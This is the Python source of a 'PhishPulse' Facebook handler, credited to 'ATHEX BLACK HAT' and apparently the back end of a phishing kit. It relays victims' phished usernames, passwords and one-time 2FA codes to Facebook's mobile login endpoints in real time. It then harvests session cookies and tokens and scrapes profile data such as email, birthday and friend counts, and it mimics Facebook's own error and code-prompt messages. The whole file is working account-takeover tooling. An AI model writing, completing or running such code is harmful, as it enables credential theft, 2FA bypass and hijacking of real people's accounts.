#!/usr/bin/env python3
"""
PhishPulse - Facebook Handler
Version: 1.0
Author: ATHEX BLACK HAT

Handles: Login, 2FA, Profile Fetch, Cookies Extraction
Uses Facebook Mobile API for better reliability
"""

import requests
import json
import re
import time
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style

class FacebookHandler:
    """Advanced Facebook API Handler"""
    
    def __init__(self):
        self.name = "Facebook"
        self.base_url = "https://www.facebook.com"
        self.mbasic_url = "https://mbasic.facebook.com"
        self.graph_url = "https://graph.facebook.com"
        self.user_agent_default = "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
        self.session = requests.Session()
        self.fb_dtsg = None
        self.user_id = None
        
        # Mobile API headers
        self.mobile_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }
    
    def _extract_cookies(self, response):
        """Extract all cookies from response"""
        cookies_dict = {}
        for cookie in response.cookies:
            cookies_dict[cookie.name] = cookie.value
        
        # Also extract from Set-Cookie headers
        set_cookie_headers = response.headers.get('Set-Cookie', '')
        if set_cookie_headers:
            for cookie_str in set_cookie_headers.split(','):
                cookie_str = cookie_str.strip()
                if '=' in cookie_str:
                    parts = cookie_str.split(';')[0].split('=')
                    if len(parts) == 2:
                        cookies_dict[parts[0].strip()] = parts[1].strip()
        
        return cookies_dict
    
    def _extract_fb_dtsg(self, html):
        """Extract fb_dtsg token from HTML"""
        patterns = [
            r'name="fb_dtsg" value="([^"]+)"',
            r'"fb_dtsg":"([^"]+)"',
            r'fb_dtsg=([^&]+)',
            r'"DTSGInitialData".*?"token":"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        
        return None
    
    def _extract_user_id(self, html):
        """Extract user ID from HTML"""
        patterns = [
            r'"USER_ID":"(\d+)"',
            r'"userID":"(\d+)"',
            r'c_user=(\d+)',
            r'"ACCOUNT_ID":"(\d+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        
        return None
    
    def _parse_2fa_type(self, html):
        """Detect 2FA type from page content"""
        html_lower = html.lower()
        
        if 'two_factor' not in html_lower and 'approvals_code' not in html_lower:
            return None
        
        if 'text message' in html_lower or 'sms' in html_lower or 'text you a code' in html_lower:
            return 'sms'
        elif 'authenticator' in html_lower or 'authentication app' in html_lower or 'generate a code' in html_lower:
            return 'authenticator'
        elif 'email' in html_lower and ('code' in html_lower or 'sent' in html_lower):
            return 'email'
        elif 'notification' in html_lower or 'tap yes' in html_lower:
            return 'notification'
        else:
            return 'unknown'
    
    def login(self, username, password, user_agent=None):
        """
        Attempt Facebook Login
        
        Args:
            username: Facebook email/phone/username
            password: Plain text password
            user_agent: Browser user agent
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        # Use mbasic Facebook for better compatibility
        login_url = f"{self.mbasic_url}/login/device-based/regular/login/"
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://mbasic.facebook.com',
            'Referer': 'https://mbasic.facebook.com/',
            'Upgrade-Insecure-Requests': '1',
        }
        
        try:
            # Step 1: Get login page for initial cookies and tokens
            init_response = self.session.get(
                self.mbasic_url,
                headers=headers,
                timeout=30
            )
            
            init_cookies = self._extract_cookies(init_response)
            self.fb_dtsg = self._extract_fb_dtsg(init_response.text)
            
            # Step 2: Perform login
            login_data = {
                'email': username,
                'pass': password,
                'login': 'Log In',
            }
            
            if self.fb_dtsg:
                login_data['fb_dtsg'] = self.fb_dtsg
            
            # Update headers with cookies
            cookie_str = '; '.join([f'{k}={v}' for k, v in init_cookies.items()])
            headers['Cookie'] = cookie_str
            
            login_response = self.session.post(
                login_url,
                headers=headers,
                data=login_data,
                timeout=30,
                allow_redirects=True
            )
            
            # Extract cookies after login
            cookies = self._extract_cookies(login_response)
            response_text = login_response.text
            
            # Check login status
            if 'c_user' in cookies:
                # Successful login
                self.user_id = cookies.get('c_user', '')
                
                # Fetch profile
                profile_info = self._fetch_profile(cookies, user_agent)
                
                return {
                    'authenticated': True,
                    'status': 'ok',
                    'user_id': self.user_id
                }, cookies, profile_info
            
            # Check for 2FA
            twofa_type = self._parse_2fa_type(response_text)
            if twofa_type:
                # Extract 2FA identifier if available
                twofa_id = self._extract_fb_dtsg(response_text) or ''
                
                return {
                    'authenticated': False,
                    'two_factor_required': True,
                    'two_factor_identifier': twofa_id,
                    'twofa_method': twofa_type,
                    'status': 'ok',
                    'message': self._get_2fa_message(twofa_type)
                }, cookies, {}
            
            # Check for error messages
            error_msg = self._extract_error(response_text)
            
            return {
                'authenticated': False,
                'status': 'ok',
                'message': error_msg,
                'user': True
            }, {}, {}
        
        except Exception as e:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Connection error. Please try again.',
                'user': True
            }, {}, {}
    
    def verify_2fa(self, code, identifier, username, user_agent=None, method='unknown'):
        """
        Verify Facebook Two-Factor Authentication
        
        Args:
            code: 6-digit verification code
            identifier: fb_dtsg or 2FA identifier
            username: Facebook username
            user_agent: Browser user agent
            method: 2FA method
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        # Try multiple 2FA endpoints
        endpoints = [
            f"{self.mbasic_url}/login/device-based/verify-factor/",
            f"{self.base_url}/login/device-based/verify-factor/",
            f"{self.mbasic_url}/checkpoint/",
        ]
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://mbasic.facebook.com',
            'Referer': 'https://mbasic.facebook.com/login/',
        }
        
        twofa_data = {
            'approvals_code': code,
            'fb_dtsg': identifier,
            'submit[Submit Code]': 'Submit Code',
        }
        
        try:
            for endpoint in endpoints:
                try:
                    response = self.session.post(
                        endpoint,
                        headers=headers,
                        data=twofa_data,
                        timeout=30,
                        allow_redirects=True
                    )
                    
                    cookies = self._extract_cookies(response)
                    
                    if 'c_user' in cookies:
                        profile_info = self._fetch_profile(cookies, user_agent)
                        return {
                            'authenticated': True,
                            'status': 'ok'
                        }, cookies, profile_info
                
                except:
                    continue
            
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Invalid verification code.'
            }, {}, {}
        
        except Exception as e:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Verification failed. Please try again.'
            }, {}, {}
    
    def _fetch_profile(self, cookies, user_agent=None):
        """Fetch Facebook profile information"""
        if not user_agent:
            user_agent = self.user_agent_default
        
        access_token = cookies.get('access_token', '')
        c_user = cookies.get('c_user', '')
        
        profile = {
            'email': '',
            'phone': '',
            'full_name': '',
            'friends_count': 0,
            'followers': 0,
            'is_verified': False,
            'profile_url': '',
            'gender': '',
            'birthday': '',
            'location': '',
        }
        
        cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
        headers = {
            'User-Agent': user_agent.strip(),
            'Cookie': cookie_str,
            'Accept': 'application/json',
        }
        
        try:
            # Try Graph API if access token available
            if access_token:
                response = requests.get(
                    f'{self.graph_url}/me?fields=id,name,email,friends,verified&access_token={access_token}',
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    profile['email'] = data.get('email', '')
                    profile['full_name'] = data.get('name', '')
                    profile['is_verified'] = data.get('verified', False)
                    if 'friends' in data:
                        profile['friends_count'] = data['friends'].get('summary', {}).get('total_count', 0)
            
            # Try mobile profile page
            if c_user:
                response = requests.get(
                    f'{self.mbasic_url}/profile.php?id={c_user}',
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    html = response.text
                    
                    # Extract name
                    name_match = re.search(r'<title>(.*?)</title>', html)
                    if name_match and not profile['full_name']:
                        profile['full_name'] = name_match.group(1).replace(' | Facebook', '').strip()
                    
                    # Extract email from account settings if accessible
                    # This is limited but we try
                    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
                    if email_match:
                        profile['email'] = email_match.group(1)
            
            # Try Facebook mobile API
            response = requests.get(
                f'{self.base_url}/me',
                headers=headers,
                timeout=10,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                html = response.text
                
                # Try to extract profile data from JS
                profile_match = re.search(r'"profile":\s*({[^}]+})', html)
                if profile_match:
                    try:
                        profile_data = json.loads(profile_match.group(1))
                        profile['full_name'] = profile_data.get('name', profile['full_name'])
                    except:
                        pass
        
        except:
            pass
        
        return profile
    
    def _get_2fa_message(self, method):
        """Get appropriate 2FA message"""
        messages = {
            'sms': 'Enter the code we sent to your phone number.',
            'email': 'Enter the code we sent to your email.',
            'authenticator': 'Enter the code from your authentication app.',
            'notification': 'Check your other devices and approve the login.',
        }
        return messages.get(method, 'Enter your 6-digit verification code.')
    
    def _extract_error(self, html):
        """Extract error message from Facebook response"""
        error_patterns = [
            r'id="login_error"[^>]*>\s*([^<]+)',
            r'class="[^"]*error[^"]*"[^>]*>\s*([^<]+)',
            r'<div[^>]*role="alert"[^>]*>\s*([^<]+)',
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                error_text = match.group(1).strip()
                error_text = re.sub(r'<[^>]+>', '', error_text)
                if error_text:
                    return error_text
        
        if 'incorrect' in html.lower():
            return 'The password you entered is incorrect.'
        elif 'not exist' in html.lower() or 'no account' in html.lower():
            return 'No account found with this information.'
        elif 'disabled' in html.lower():
            return 'This account has been disabled.'
        elif 'checkpoint' in html.lower():
            return 'Your account requires additional verification.'
        
        return 'Invalid credentials. Please try again.'